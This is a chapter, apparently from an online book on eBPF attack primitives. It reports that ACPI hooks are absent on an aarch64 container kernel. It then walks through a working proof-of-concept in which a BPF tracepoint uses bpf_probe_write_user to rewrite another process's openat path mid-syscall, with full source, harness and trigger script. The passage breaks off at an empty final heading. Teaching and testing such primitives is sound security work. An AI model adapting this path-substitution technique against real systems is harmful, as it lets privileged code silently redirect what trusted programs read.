---
layout: book
title: "Chapter 17: ACPI WSMI Ping"
date: 2025-05-07
---

# Chapter 17: Where the ACPI Interpreter Isn't

> **Note**: This primitive's natural hook did not fire on the test kernel. See [Chapter 21 — Skip Accounting]({{ site.baseurl }}/book/act-3/chapter-21-the-autopsy-what-refused-to-die.html) and the surviving workaround variant at [dBPF-pocs/pocs/ch17-acpi-wsmi-analog/](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs).

The chapter as originally drafted hooks `acpi_evaluate_object`, watches for a specific ACPI pathname (`\_SB._WS0.Ping`), and swaps in custom AML parameters. That scenario is architecturally x86. I was working on aarch64 and the first thing I did was check whether the symbols exist:

```
$ grep acpi_evaluate_object /proc/kallsyms
$ grep acpi_ns_evaluate /proc/kallsyms
$ grep acpi_ex_execute_method /proc/kallsyms
```

All three returned nothing. Docker Desktop's linuxkit kernel (6.12 aarch64) ships without the ACPI interpreter. There is no `acpi_*` symbol to kprobe. The chapter's primary scenario cannot fire on this platform.

## The negative result is the result

It is worth being honest about why the symbols are missing before moving on, because the missingness is not an accident of the build — it is the platform telling you something about itself. ACPI — the Advanced Configuration and Power Interface — is an x86 legacy. It predates the modern device-tree model by roughly a decade. On a physical x86 machine the firmware ships a pile of AML bytecode in DSDT and SSDT tables, and the kernel ships an interpreter that walks them to answer questions about hardware. Everything from "what does pressing the power button do" to "where is the EC that tells me the battery level" is expressed as an AML method in those tables. On x86 Linux kernels with `CONFIG_ACPI=y`, `drivers/acpi/acpica/*` compiles the interpreter in and the kallsyms for `acpi_evaluate_object`, `acpi_ns_evaluate`, and `acpi_ex_execute_method` all exist.

On aarch64 the story is different. Linux on aarch64 uses device-tree blobs as the primary hardware-description format. Some aarch64 server parts support ACPI as a secondary option under SBBR, but container images and cloud VMs almost never enable it. The linuxkit kernel that Docker Desktop uses on Apple Silicon has `CONFIG_ACPI` off. There is no ACPI namespace, no AML, no interpreter, and no symbol in kallsyms to hook.

```
$ uname -m
aarch64
$ grep -c '^CONFIG_ACPI' /proc/config.gz 2>/dev/null
$ zcat /proc/config.gz 2>/dev/null | grep -E '^CONFIG_ACPI=' || echo "(no ACPI config exposed)"
$ ls /sys/firmware/acpi 2>/dev/null || echo "(no /sys/firmware/acpi)"
```

The last line is the clearest tell. `/sys/firmware/acpi/` is populated on any machine where the ACPI subsystem is live. On this kernel the directory does not exist. No enforcement point; no hook; no primitive. That is a legitimate negative result and the chapter is going to admit it rather than route around it.

I want to be pedantic about the category of this failure, because it is the most common shape of skip in the whole book and the naming matters. This is not a verifier refusal. The verifier never saw the program, because the program never loaded — `libbpf` refused to resolve `acpi_evaluate_object` before the kernel ever got a `bpf()` syscall. This is not a policy refusal either; no LSM said no, no audit rule fired. This is the kernel simply not containing the code the attack wants to attach to. The `/proc/kallsyms` check is enough to know ahead of time. I add it as a preflight in every loader in this book for exactly this reason: fail cheaply, fail early, say why.

I should also acknowledge that ACPI-on-aarch64 is a real thing on some hardware. The Neoverse reference platform supports ACPI. AWS Graviton supports ACPI. Those are production kernels where this chapter's original scenario could be re-tested; I did not have one to hand. If you do, the right move is to rerun the original draft's hook set and see what lands. The chapter's text stays honest either way: for the kernel I had, the original primitive did not fire; for a kernel with ACPI enabled on aarch64, a subset of the x86 symbols should be present and the original program should load.

## The pivot to `request_firmware`, and a second negative

Having lost the ACPI surface, the next candidate was `request_firmware`. The shape of the primitive is similar. A kernel driver receives a request — from userspace, from a probe, from a deferred timer — to fetch a named firmware blob. The kernel translates the name into a filesystem lookup via the firmware_loader subsystem, which eventually calls into `fs/` to open and read the blob. A BPF program sitting on `request_firmware` can see the name the driver asked for before the filesystem resolves it; a BPF program that also has `bpf_probe_write_user` available to the caller's memory can rewrite the name.

```
$ grep -E ' T (|_)request_firmware|firmware_request_nowarn' /proc/kallsyms
ffff80000866f7e0 T _request_firmware
ffff80000866ff88 T request_firmware
ffff80000866ffe0 T firmware_request_nowarn
```

So `request_firmware` and friends are there — the symbols exist, kallsyms knows about them, a kprobe would attach. That is necessary but not sufficient. For a kprobe on `request_firmware` to fire, some driver in the running kernel actually has to call it. On a desktop Linux install that is always true: graphics drivers, Wi-Fi drivers, the NIC, the SSD controller, audio codecs — they all pull firmware blobs. On the linuxkit kernel I had, none of those drivers are loaded. The environment is a stripped container-host kernel. There is no Wi-Fi. There is no discrete GPU. There is no audio. The only block device is a virtio block device that needs no external firmware. `request_firmware` is compiled in, and kallsyms tells you so, but nothing reaches it at runtime.

You can confirm the runtime silence directly. Attach a pure observer kprobe to `request_firmware` and let it run for a few minutes in a normal container session:

```
$ bpftool prog attach kprobe/request_firmware fw_watcher
$ # wait 60s; do normal container things
$ bpftool map dump name events
(no events)
```

Zero events. The kprobe is attached, the probe is loaded, the ringbuf is empty. The next obvious question was whether I could *provoke* a firmware request — ship `test_firmware` as a module and have it call `request_firmware` myself. `test_firmware` is a kernel-internal test harness for the firmware_loader that you can load as a module on kernels built with `CONFIG_TEST_FIRMWARE=m`. On linuxkit it is not available:

```
$ modinfo test_firmware 2>/dev/null
(nothing)
$ find /lib/modules -name test_firmware\* 2>/dev/null
(empty)
```

No test harness. No loadable module. No driver that calls `request_firmware` at runtime. The probe attaches and hears silence. That is a second negative result, narrower than the first but with the same shape: the hook exists, nothing calls the hook, the primitive cannot fire.

At this point the principled move is to declare the chapter an honest skip and move on. That is what the harness does in its original code path — it emits `CH17_SKIP reason="no acpi nor firmware symbols"` and exits 2 rather than pretending to succeed. The chapter as shipped in the book keeps that behavior for the default entrypoint. What the workaround variant does, separately, is demonstrate the primitive shape against a surface that *is* live on this kernel, and label the result honestly so the reader can tell it apart from the real thing.

## An aside on what kprobe silence actually means

One more aside before moving to the analog. A kprobe attached to a symbol that is never called at runtime is, from the BPF system's perspective, indistinguishable from a kprobe attached to a symbol that will fire in five minutes. The BPF verifier loads it, the kprobe infrastructure installs the int3 / brk breakpoint into the kernel text, and the probe is "live" in the sense that the infrastructure is ready for it. But the probe has never fired, and if nothing calls the probed function, it never will.

This matters for threat modelling because the naive question "can the attacker attach a probe to `request_firmware`?" is answered yes on this kernel — the symbol is exported, the attach succeeds, the verifier is happy. The more useful question is "what happens when the attack attaches a probe to `request_firmware` and nothing calls it?" The answer is, nothing. The probe sits quiet. The attacker gets no observations. No data exfils.

This is a point that cuts both ways. From the defender's perspective it is a small comfort: the attack surface of a hooks-but-no-callers surface is zero in practice. From the attacker's perspective it is a reconnaissance step: the attacker has to check not just "is the symbol present" but "does anything actually call the symbol on this target." Those are different questions and they have different answers on different kernel builds. A full distro kernel with laptop drivers compiled in has frequent `request_firmware` calls. A stripped cloud-image kernel may never call it. A Docker Desktop linuxkit kernel definitely does not.

The harness's approach is to make this discoverability explicit. The skip marker `CH17_SKIP reason="..."` is printed when the primitive cannot fire on the current kernel. The reader of the marker knows the attack did not run, and knows why. A silent no-op would be worse in every way: it would look like success, or it would look like a bug in the primitive rather than a property of the kernel.

## The userspace analog, scoped

The workaround POC lives at `dBPF-pocs/pocs/ch17-acpi-wsmi-analog/`. It has three parts:

- `fw_requester.c` — a tiny unprivileged userspace process that stands in for a kernel driver that would otherwise call `request_firmware`. It reads a basename from stdin, composes `/tmp/<basename>` into a heap buffer, calls `open()` on that buffer, reads the file, and prints the contents along with the name it thought it was opening.
- `ch17-acpi-wsmi-analog.bpf.c` — a tracepoint-based BPF program on `syscalls/sys_enter_openat`. It filters on `comm == "fw_requester"`, reads the user-space path, compares it to a fixed expected string, and if it matches, overwrites the user buffer with an attacker-controlled alternate path using `bpf_probe_write_user`.
- `ch17-acpi-wsmi-analog.c` — the loader. Attaches the tracepoint, drains a ringbuf of match/swap events, prints each one.

The primitive on display is not an ACPI exploit. It is the motion that an ACPI exploit would use if the ACPI interpreter were here: intercept a kernel-mediated string that was chosen by a trusted component, rewrite it in flight before the side-effect resolves. In the ACPI case the string is an AML pathname like `\_SB._WS0.Ping`. In the `request_firmware` case the string is a firmware basename like `brcm/brcmfmac-pcie.bin`. In the userspace analog the string is an openat path like `/tmp/CH17_REQ_real_firmware.bin`. Three different strings, three different subsystems, same motion. That equivalence is not a full substitute for the real thing — and the chapter is going to repeat that it is not — but it lets the reader see the motion on a surface that exists on a kernel they can actually boot.

The file header on the BPF source makes the scope explicit:

```c
// ch17 ACPI / WSMI ANALOG
// ---------------------------------------------------------------------------
// DISCLAIMER: Real ACPI method evaluation (acpi_evaluate_object /
// request_firmware) does not fire on this kernel — no drivers call those
// paths, no test_firmware module is loaded. This analog reproduces the
// *primitive shape* ("kernel-mediated string content substituted in flight")
// against a userspace "firmware requester" whose openat() path argument we
// rewrite via bpf_probe_write_user before the syscall body runs.
//
// This is NOT an ACPI exploit. It demonstrates the motion: intercept the
// call that carries a string chosen by a trusted component, rewrite that
// string before the side-effect (file open) resolves.
```

I am going to walk the three files in order. First the requester, then the BPF program, then the harness story.

## `fw_requester`: the stand-in for a kernel caller

`fw_requester.c` is the smallest thing that exercises the primitive end to end. It is a single-file C program, compiled to `build/fw_requester`, and it runs as whatever user invokes it — no special privileges. Its job is to produce a predictable openat syscall with a known path in a known buffer, so the BPF program has something unambiguous to rewrite.

```c
prctl(PR_SET_NAME, (unsigned long)"fw_requester", 0, 0, 0);
```

The first non-declarative line sets the task's `comm` to the string `fw_requester`. This matters because the BPF program filters on `comm` — `bpf_get_current_comm()` reads exactly this 16-byte field out of `task_struct`. If I had relied on `argv[0]` or the binary name, then any binary name change (e.g., running the analog under a wrapper, or being launched by `su` with a shell in between) would silently miss the filter. Setting `comm` via `prctl(PR_SET_NAME, ...)` pins the filter target to something the program controls, independent of how the harness invokes it.

```c
char *path = malloc(PATH_CAP);
if (!path) { perror("requester: malloc"); return 1; }
memset(path, 0, PATH_CAP);
```

`PATH_CAP` is 256. The buffer is heap-allocated deliberately. `bpf_probe_write_user` wants a *writable* user-space mapping to write to. A stack allocation would also be writable, but a stack allocation is subject to protections that heap is not on some hardened builds (stack canaries in particular do not care about writes, but page protection on a guard page can), and I wanted the analog to be robust against the kind of build-flag variance you get when someone tries this on a distro kernel. A heap allocation from glibc's `malloc` is backed by writable anonymous pages, which is what `bpf_probe_write_user` wants.

Why 256 bytes? The expected original path is `"/tmp/CH17_REQ_real_firmware.bin"` at 31 bytes. The replacement path is `"/tmp/CH17_REQ_attacker_replacement.bin"` at 38 bytes. The replacement is 7 bytes longer than the original. If the buffer were exactly-sized to the original path — for example, a stack array of 32 bytes — then overwriting it with the replacement would write past the end of the allocation, and if the allocation were stack, it would corrupt the stack frame in the victim process. 256 bytes of slack is generous headroom for any reasonable path rewrite and removes the buffer-size gotcha entirely. A realistic attack would have to be more careful about this.

```c
char basename[128] = {};
if (!fgets(basename, sizeof(basename), stdin)) {
    fprintf(stderr, "requester: stdin empty\n");
    free(path);
    return 2;
}
size_t bl = strlen(basename);
while (bl > 0 && (basename[bl-1] == '\n' || basename[bl-1] == '\r'))
    basename[--bl] = 0;
```

The basename comes from stdin, one line. This is how the harness drives it — `echo "CH17_REQ_real_firmware.bin" | ./fw_requester` — so the test can vary the basename without recompiling. Newline-stripping is aggressive on purpose: an accidental `\r\n` from a Windows-origin input would otherwise poison the path and the BPF comparator would silently miss.

```c
int n = snprintf(path, PATH_CAP, "%s%s", TMPDIR, basename);
if (n < 0 || n >= PATH_CAP) {
    fprintf(stderr, "requester: path too long\n");
    free(path);
    return 2;
}

char requested[PATH_CAP];
memcpy(requested, path, PATH_CAP);
```

Compose the path into the heap buffer, then snapshot the composed string into a local buffer *before* calling `open`. The snapshot is important. After `bpf_probe_write_user` rewrites `path`, any print that uses `path` prints the rewritten contents, which would hide the substitution from the output. The `requested` snapshot is the requester's record of what it *thought* it was opening. The BEFORE/AFTER contrast in the trigger's proof output relies on having both: what was asked for, and what was served.

```c
int fd = open(path, O_RDONLY);
```

One syscall. `open(2)` on Linux is actually `openat(AT_FDCWD, path, flags)` under the hood, which is why the BPF program attaches to `sys_enter_openat` and not `sys_enter_open`. The glibc wrapper rewrites. The BPF side sees an `openat` with an `AT_FDCWD` dirfd and a path pointer, and that is the call whose path argument the tracepoint will rewrite.

```c
char content[256] = {};
ssize_t r = read(fd, content, sizeof(content) - 1);
close(fd);
```

Read the file contents into a local buffer and print them. The analog is complete: a composed path was used for an `open` call, the kernel consulted the filesystem with whatever path it actually ended up with, the file was read, the contents were printed.

```c
fprintf(stdout, "requester: requested=\"%s\" buffer_after=\"%s\" content=\"%s\"\n",
        requested, path, content);
```

The final line prints three things. `requested` is the snapshot — what the user thought it asked for. `buffer_after` is the contents of the heap buffer *after* the kernel's syscall returned, which will differ from `requested` if and only if `bpf_probe_write_user` fired and rewrote the buffer. `content` is what the file actually contained. The trigger's assertion is on `content`: if `content` matches the contents of the replacement file rather than the original file, the primitive proved out.

This is a deliberately small, boring, unprivileged program. If it were not for the BPF program running alongside it, running `fw_requester` with basename `CH17_REQ_real_firmware.bin` would simply open `/tmp/CH17_REQ_real_firmware.bin`, read it, and print `ORIGINAL\n` (the seeded content). With the BPF program attached, the same invocation reads `/tmp/CH17_REQ_attacker_replacement.bin` and prints `REPLACED`. The program itself is unchanged. The kernel's view of its argument was rewritten mid-syscall.

## A word about tracepoints versus kprobes here

The analog attaches via a tracepoint (`tp/syscalls/sys_enter_openat`) rather than via a kprobe, and the choice merits a short justification because tracepoints and kprobes have different availability and different semantics.

A kprobe binds to a kernel function address; attaching a kprobe to `__arm64_sys_openat` would work in theory on this kernel. The tradeoff is that kprobes are dynamic — they modify kernel text to install a breakpoint — and some hardened kernels disable them (`CONFIG_KPROBES=n`). Tracepoints are statically compiled trace-event entry points that the kernel developers have placed at defined points in the code; they have no kernel-text modification, and `CONFIG_TRACEPOINTS` is enabled on essentially every Linux kernel.

The `sys_enter_*` tracepoints are specifically interesting because they fire at a defined point in the syscall entry machinery, before the syscall body runs, with a well-typed context struct. The context struct exposes the raw syscall arguments as an array indexed by position. For `openat(int dirfd, const char *pathname, int flags, ...)`, the args array has dirfd at index 0, the path pointer at index 1, flags at index 2. This is guaranteed by the syscall machinery; a kprobe on `__arm64_sys_openat` would have to extract the arguments from `struct pt_regs`, which on aarch64 means reading x0/x1/x2 explicitly. The tracepoint approach is portable across architectures in a way the kprobe approach is not.

The cost is that tracepoints fire at a single defined point; I cannot choose to attach mid-function or at return. For the primitive demonstrated here the single defined point is exactly what I want — I need sys_enter, before `getname()` runs, with the user pointer still dereferenceable. For a primitive that needed a different window, I would have had to use kprobes and worry about the architecture-specific argument extraction.

## `ch17-acpi-wsmi-analog.bpf.c` line by line

The BPF program is 120 lines, most of them declarative. I want to walk it end-to-end because every line exists for a reason.

```c
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";
```

Standard libbpf preamble. `vmlinux.h` is generated at build time from the running kernel's BTF — the harness regenerates it per-POC — so the struct layouts match the kernel we will actually attach to. `GPL` license is required because we use helpers (`bpf_probe_write_user` in particular) that are GPL-only.

```c
#define PATH_SCAN_LEN 96

#define ORIG_PATH "/tmp/CH17_REQ_real_firmware.bin"
#define REPL_PATH "/tmp/CH17_REQ_attacker_replacement.bin"
#define ORIG_LEN  31   // strlen(ORIG_PATH)
#define REPL_LEN  38   // strlen(REPL_PATH)
```

The comparator scans 96 bytes of the user path. The original is 31 bytes plus a NUL. Over-scanning costs the verifier a few instructions but guarantees we catch the NUL terminator inside the scan window even if a malicious caller tried to extend the string to match at a prefix.

```c
struct evt {
    unsigned int pid;
    unsigned int tgid;
    char         comm[16];
    int          swapped;
    int          matched;
    char         orig[PATH_SCAN_LEN];
};
```

The event record is deliberately larger than would fit comfortably on the BPF stack — the BPF stack is 512 bytes, and `orig[PATH_SCAN_LEN]` alone is 96 bytes, plus `comm[16]`, plus ints, plus PIDs, plus alignment, is pushing 128+ bytes. The verifier tolerates that, but combined with the comparator loop's stack traffic it hits the limit. Hence the percpu scratch map below.

```c
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __type(key, unsigned int);
    __type(value, struct evt);
    __uint(max_entries, 1);
} scratch SEC(".maps");
```

Two maps. The ringbuf is the output channel, 256 KiB. The scratch map is a per-CPU array with a single element: we use it as heap storage for the `evt` struct so we do not pay for it on the BPF stack. Per-CPU means no cross-CPU contention; single element means we always key with 0.

```c
static __always_inline int streq_origpath(const char *s)
{
    static const char expect[32] = ORIG_PATH; // 31 bytes + trailing NUL
    int diff = 0;
    #pragma unroll
    for (int i = 0; i < 32; i++) {
        diff |= (int)((unsigned char)s[i] ^ (unsigned char)expect[i]);
    }
    return diff == 0;
}
```

This is the verifier-friendly string comparator, and the reason it looks weird deserves explanation because it is a real verifier dead end I hit.

My first version was the straightforward thing:

```c
// first try — did not work
if (s[0] == '/' && s[1] == 't' && s[2] == 'm' && s[3] == 'p' && ... )
```

32 character comparisons in a chained `&&`. Each comparison spills an intermediate into the BPF stack because the verifier tracks each comparison's result. The verifier complained about stack usage: once I got past about 20 chained comparisons, the generated code was allocating so many stack slots that the program exceeded the 512-byte BPF stack limit. It was a real verifier refusal, not a compile warning. The program would not load.

The fix is the XOR-OR reduction. Each iteration XORs one byte of the input against one byte of the expected string; the result is ORed into a running accumulator `diff`. After 32 iterations `diff` is zero if and only if every byte matched. The key property is that `diff |= x` is a single ALU instruction that the verifier tracks as a single integer value — no stack slots per iteration, no branch proliferation, no chained `&&` tree. The total stack consumption of the comparator is `diff` itself: four bytes.

`#pragma unroll` plus a compile-time-bounded loop turns this into 32 inline XOR-OR operations in the emitted instruction stream, which is trivial for the verifier to analyze. The `__always_inline` attribute on the enclosing function ensures the comparator does not become a function call, because BPF-to-BPF calls have their own stack budget.

I want to flag this because every BPF programmer hits this wall at some point, and the pattern — XOR-OR accumulate over a bounded unrolled loop — is the answer in almost every "how do I compare two byte arrays" scenario in BPF. It is the kind of trick that is obvious once you know it and completely opaque before.

```c
static __always_inline int comm_is_fw_requester(const char *c)
{
    static const char expect[13] = "fw_requester"; // 12 chars + NUL
    int diff = 0;
    #pragma unroll
    for (int i = 0; i < 13; i++) {
        diff |= (int)((unsigned char)c[i] ^ (unsigned char)expect[i]);
    }
    return diff == 0;
}
```

Same pattern for the `comm` check. 13 bytes = 12 chars + NUL. `bpf_get_current_comm` always zeros out the tail of the 16-byte buffer, so comparing 13 bytes against a 12-char string followed by NUL is a correct equality check.

```c
SEC("tp/syscalls/sys_enter_openat")
int tp_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    unsigned long user_path = (unsigned long)ctx->args[1];
    if (!user_path) return 0;
```

The attach point is the `sys_enter_openat` tracepoint. Tracepoints are a different animal from kprobes; in particular they fire at statically defined points in the kernel with a typed context. The context here is `struct trace_event_raw_sys_enter`, whose `args[]` array exposes the raw syscall argument registers. `args[1]` is the second argument — which, for `openat(int dirfd, const char *pathname, int flags, ...)`, is the user-space pointer to the path.

```c
    char comm[16] = {};
    bpf_get_current_comm(&comm, sizeof(comm));
    if (!comm_is_fw_requester(comm)) return 0;
```

Fetch the calling task's `comm` and bail out if it is not our requester. This filter is the first line of defence: a system is running hundreds of openat calls per second from every process, and the comparator + ringbuf + probe_write_user path is not cheap. Filtering early keeps the observer tame.

```c
    unsigned int zero = 0;
    struct evt *e = bpf_map_lookup_elem(&scratch, &zero);
    if (!e) return 0;

    __builtin_memset(e, 0, sizeof(*e));
    long n = bpf_probe_read_user_str(&e->orig, sizeof(e->orig),
                                     (const void *)user_path);
    if (n <= 0) return 0;
```

Pull the scratch struct off the per-CPU map, zero it, read the user path into its `orig` field. `bpf_probe_read_user_str` is the safe path for reading NUL-terminated strings from userspace; it returns the number of bytes read including the terminator, or a negative error. `n <= 0` covers both read failures (page not resident, bad pointer) and zero-length strings.

```c
    if (!streq_origpath(e->orig))
        return 0;

    e->matched = 1;
```

Compare the read path to the expected original. If it does not match, drop. If it does, note the match and move to the rewrite.

```c
    static const char repl[] = REPL_PATH;   // includes NUL
    long rc = bpf_probe_write_user((void *)user_path,
                                   repl, sizeof(repl));
    e->swapped = (rc == 0);
```

This is the primitive itself. `bpf_probe_write_user` takes a user-space destination pointer, a kernel-side source, and a length, and writes the source into the destination user-space memory. It returns 0 on success. On failure it returns a negative error — usually `-EFAULT` if the user page is not resident or is not writable, or `-EINVAL` if the helper is called outside a valid context.

We write `sizeof(repl)` bytes, which for a string literal is `strlen + 1` to include the trailing NUL. The replacement is 38 bytes of path + 1 byte NUL = 39 bytes. The requester's heap buffer is 256 bytes, so the write is safely within bounds. If the original had been written to a tight buffer we would be smashing something in the requester's address space; in this POC the buffer sizing is deliberately generous to keep the demonstration clean.

The `e->swapped` flag records the rewrite outcome so the loader can correlate the match with the actual write success. In practice on a well-behaved caller the write always succeeds; the flag exists so that the rare failure case does not silently look like a successful rewrite to the userspace consumer.

```c
    unsigned long long id = bpf_get_current_pid_tgid();
    e->pid  = (unsigned int)(id & 0xffffffff);
    e->tgid = (unsigned int)(id >> 32);
    __builtin_memcpy(e->comm, comm, sizeof(e->comm));

    struct evt *ev = bpf_ringbuf_reserve(&events, sizeof(*ev), 0);
    if (ev) {
        __builtin_memcpy(ev, e, sizeof(*ev));
        bpf_ringbuf_submit(ev, 0);
    }
    return 0;
}
```

Finish populating the scratch event, reserve a ringbuf slot, memcpy the scratch into it, submit. The pattern "fill a scratch struct, then copy it into a ringbuf reservation" is a common verifier-friendly idiom; reserving directly would work too but complicates the partial-population paths.

## The verifier story behind the XOR-OR comparator

I mentioned the XOR-OR reduction in passing; it deserves a full paragraph because the process of getting it past the verifier is instructive.

My first attempt was a `strncmp`-like loop:

```c
// does not verify
static __always_inline int streq_bad(const char *s, const char *e, int n) {
    for (int i = 0; i < n; i++) {
        if (s[i] != e[i]) return 0;
        if (s[i] == 0) return 1;
    }
    return 1;
}
```

This verifies, but only at low `n`. Each branch `if (s[i] != e[i])` is a conditional the verifier has to track the state of; past about 16 iterations the combined state space explodes and the verifier refuses. The verifier complaint is subtle — it is not about stack, it is about "program exceeds 1 million instruction limit" or "too many loops" depending on kernel version.

My second attempt tried to bound the loop more tightly:

```c
// also does not verify, for a different reason
int diff = 0;
#pragma unroll
for (int i = 0; i < 32; i++) {
    if (s[i] != expect[i]) diff = 1;
}
return diff == 0;
```

This fails at the verifier with a stack-slot complaint. Each `s[i]` dereference requires the verifier to prove `s + i` is in bounds of the input; with 32 such dereferences, each feeding a conditional, the verifier tracks a growing state space on its internal stack. The program ends up with more spilled state than the 512-byte BPF stack allows.

The XOR-OR reduction avoids both problems by eliminating the conditional entirely:

```c
int diff = 0;
#pragma unroll
for (int i = 0; i < 32; i++) {
    diff |= (int)((unsigned char)s[i] ^ (unsigned char)expect[i]);
}
return diff == 0;
```

Each iteration is a pure ALU operation: read `s[i]`, read `expect[i]`, XOR, OR into `diff`. No conditional. The verifier tracks `diff` as a single scalar with an upper bound of `255 * 32 = 8160` (if every byte differed, the OR accumulates all bits). The bounds are tight, the state space is trivial, the stack usage is negligible. The resulting emitted code after `#pragma unroll` is 32 straight ALU ops in a row; there is literally nothing for the verifier to be confused about.

This pattern — "replace branches with ALU, let the XOR tell you the answer" — is a cornerstone of verifier-friendly BPF. It is the same pattern used in constant-time cryptography for exactly the same reason: branches introduce state the analyzer has to track. Eliminating branches eliminates state. The pattern crops up in every BPF program I have written that compares byte sequences of non-trivial length, and I still catch myself reaching for an `if` first out of habit.

## The `sys_enter` window, explicitly

The reason this works at all is a specific property of how the kernel implements the `openat` syscall, and it is worth laying out explicitly because the analog hangs on it.

When userspace calls `open("/tmp/foo", O_RDONLY)`, glibc dispatches to `openat(AT_FDCWD, "/tmp/foo", O_RDONLY, 0)`. That enters the kernel through the syscall trampoline, which lands at `__arm64_sys_openat` (on aarch64) or `__x64_sys_openat` (on x86). Inside that handler the first thing that happens is argument marshalling — but the path argument is a pointer, so what gets marshalled initially is the pointer itself, not the string. The pointer is stashed into the kernel's view of the syscall arguments.

Then the actual syscall body runs, and somewhere early in that body — in practice, inside `do_sys_openat2` via `getname` — the kernel calls `strncpy_from_user` (or equivalent) to copy the string out of user memory into a kernel-side `struct filename`. *That* is the copy that defines reality: whatever bytes are at the user pointer at the moment `getname` runs become the kernel's canonical view of the path.

The `sys_enter_openat` tracepoint fires *before* `getname`. It fires at the entry of the syscall handler, after the register marshalling but before the body. At the moment the tracepoint fires, the path argument is still a pointer to user memory, and the kernel has not yet read the string. Between the tracepoint firing and `getname` executing, the user page is still mapped, still writable, and still has the string the user originally wrote into it.

That is the window. The tracepoint fires; the BPF program sees the pointer; the BPF program calls `bpf_probe_write_user` to rewrite the memory at the pointer; the BPF program returns; the kernel resumes the syscall body; `getname` runs and reads the now-rewritten memory; the kernel opens the file the rewrite pointed at.

The window is narrow. On a single-threaded caller it is instruction-level: the tracepoint handler and `getname` run back-to-back in the same syscall context on the same CPU. There is no opportunity for a scheduler preempt between them; the kernel holds the task's CPU through the syscall. The rewrite is atomic with respect to the victim's view because the victim is not running until the syscall returns.

It would be a different story if the syscall implementation re-read the user buffer later, after `getname`. It does not. `getname` copies once; `struct filename` is the kernel's working copy from that point forward. The victim's buffer becomes irrelevant the moment the copy completes.

This same windowing logic is how `bpf_probe_write_user` is used in general. The helper is only meaningful inside a syscall context where the kernel has a user pointer in hand but has not yet dereferenced it. Pre-dereference: writable, with effect. Post-dereference: writable, but the kernel has moved on and the write has no further kernel-observable effect (though it may confuse the userspace caller, which is occasionally useful too).

`bpf_probe_write_user` is gated by its own CAP requirements and by the fact that programs calling it are marked unsafe and locked to `CAP_SYS_ADMIN` (or equivalent) at load. The kernel does not let an arbitrary BPF program write to arbitrary userspace; it requires the elevated capability specifically because this primitive is obviously useful for mischief. The gate is a design choice, not an accident. Users who grant `CAP_BPF + CAP_SYS_ADMIN` to an untrusted workload are granting this primitive specifically.

## A note on multi-CPU concurrency

One more detail the POC handles that deserves explanation: per-CPU scratch storage. Two processes named `fw_requester` could in principle be running simultaneously on different CPUs, and both could trigger the tracepoint simultaneously. If they shared a single scratch buffer, the two handlers would race and corrupt each other's event records before they reached the ringbuf.

The fix is `BPF_MAP_TYPE_PERCPU_ARRAY`. Each CPU gets its own copy of the scratch map; a lookup returns the CPU-local copy; two CPUs looking up simultaneously get two different buffers. No race. The tradeoff is memory usage: the map is allocated once per CPU, so on a 16-core machine there are 16 copies. The `evt` struct is ~120 bytes, so 16 copies is under 2 KiB. The cost is negligible; the correctness gain is total.

Per-CPU maps are a common pattern in BPF for exactly this reason. Any program that needs scratch space in a handler should use per-CPU, not shared. The pattern generalizes to stats: per-CPU counters incremented without atomics, aggregated on the consumer side. Higher throughput than atomic operations on a shared counter, at the cost of slightly-stale reads when the consumer drains.

## Harness wiring

The harness entry for the analog lives in `proof.py`:

```python
Poc("ch17a", "ACPI WSMI — userspace firmware analog",
    "ch17-acpi-wsmi-analog",
    hooks=["tp:syscalls/sys_enter_openat"],
    prefix="[ch17-analog]", mode="trigger-runs-loader", timeout=25,
    proof_marker=r"CH17_ANALOG_PROVEN|CH17_CONCEPT_PROVEN|_PROVEN"),
```

The `hooks` entry is `tp:syscalls/sys_enter_openat`, which the harness resolves by checking `/sys/kernel/debug/tracing/events/syscalls/sys_enter_openat/id`. Tracepoints have their own availability check that is distinct from kallsyms — a tracepoint is defined by its trace event, not by a kernel function symbol. If the tracepoint is not present, the harness skips.

The mode is `trigger-runs-loader`: the trigger script is responsible for launching the loader itself. This is because the trigger has to sequence three things — seed the files, run a BEFORE invocation without the loader, start the loader, run an AFTER invocation with the loader, and then collect — and doing that from the harness directly would couple the harness to this POC's specific before/after workflow. Keeping the sequencing in the trigger keeps each POC self-contained.

The `proof_marker` regex is the pass/fail gate. The harness scans every line emitted on stdout by any component of the POC, and if it sees a match, it flips the POC status to `effect_demonstrated`. In the analog's case the matching line is:

```
=== CH17_ANALOG_PROVEN requested=CH17_REQ_real_firmware.bin served=REPLACED before_content=ORIGINAL swapped_events=1 disclaimer="same primitive as kernel request_firmware string swap; real request_firmware needs drivers that actually call it" ===
```

Five fields in that line carry the proof:

- `requested=...` — what `fw_requester` thought it was opening. The trigger captures this from the `requested="..."` field of the requester's stdout.
- `served=...` — what `fw_requester` actually read. This is the `content="..."` field from the AFTER invocation. If the swap worked, it is `REPLACED`; if not, it is `ORIGINAL`.
- `before_content=...` — what the requester read during the BEFORE invocation, with no loader attached. This should always be `ORIGINAL` on a working setup; if it is not, the seed files were corrupted and the test is invalid.
- `swapped_events=N` — the count of ringbuf events that reported `swapped=1`. Each successful rewrite produces one event; the count is the number of times the primitive fired. In the trigger's single-invocation flow this is exactly 1.
- `disclaimer=...` — the free-text disclaimer that the marker carries into the harness's output, so that any operator scraping harness results cannot fail to see that this is an analog.

The disclaimer field is a deliberate choice. I wanted the proof marker itself to carry the scope, not just the chapter text around it. If someone greps `_PROVEN` across harness output and pipes into a dashboard, the dashboard sees the disclaimer inline. There is no way to quote the marker without the scope tag coming along.

The trigger's check is in `trigger.sh`:

```bash
echo "=== CH17_ANALOG_PROVEN requested=CH17_REQ_real_firmware.bin served=${AFTER_CONTENT:-?} before_content=${BEFORE_CONTENT:-?} swapped_events=${SWAPPED_COUNT} disclaimer=\"same primitive as kernel request_firmware string swap; real request_firmware needs drivers that actually call it\" ==="
```

`AFTER_CONTENT` is captured from the AFTER invocation's `content="..."` field via sed. `BEFORE_CONTENT` likewise from the BEFORE. `SWAPPED_COUNT` is `grep -c 'swapped=1' "$LOADER_LOG"`. Three independent measurements, one proof line.

## How the BEFORE and AFTER numbers are actually computed

